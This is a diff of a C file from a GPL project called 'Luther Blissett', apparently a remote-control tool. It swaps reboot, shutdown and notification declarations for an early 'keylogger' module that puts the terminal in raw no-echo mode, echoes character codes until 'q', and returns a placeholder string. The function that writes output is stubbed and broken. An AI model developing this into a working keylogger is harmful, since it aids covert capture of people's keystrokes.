@@ -15,11 +15,43 @@
  *  You should have received a copy of the GNU General Public License
  *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
  */
-void lb_reboot();
+#include <stdbool.h>
+#include <stdio.h>
+#include <string.h>
+#include <termios.h>
+#include <unistd.h>
 
-void lb_shutdown();
+#include <keylogger.h>
 
-void lb_notify(char *notifyTitle, char *notifyDescription);
+static bool is_keylogger_active = false;
 
+bool keylogger_toggle() {
+  is_keylogger_active = !is_keylogger_active;
 
-void setWallpaper(const char *filePath);
+  return is_keylogger_active;
+}
+
+char *keylogger_buffer() {
+  struct termios old_tio, new_tio;
+  unsigned char c;
+
+  tcgetattr(STDIN_FILENO, &old_tio);
+
+  new_tio = old_tio;
+
+  new_tio.c_lflag &= (~ICANON & ~ECHO);
+
+  tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);
+
+  do {
+    c = getchar();
+    printf("%d ", c);
+  } while (c != 'q');
+
+  /* restore the former settings */
+  tcsetattr(STDIN_FILENO, TCSANOW, &old_tio);
+
+  return "ciao";
+}
+
+int keylog_run(const char *output_file_path) { keylogger_buffer(); }
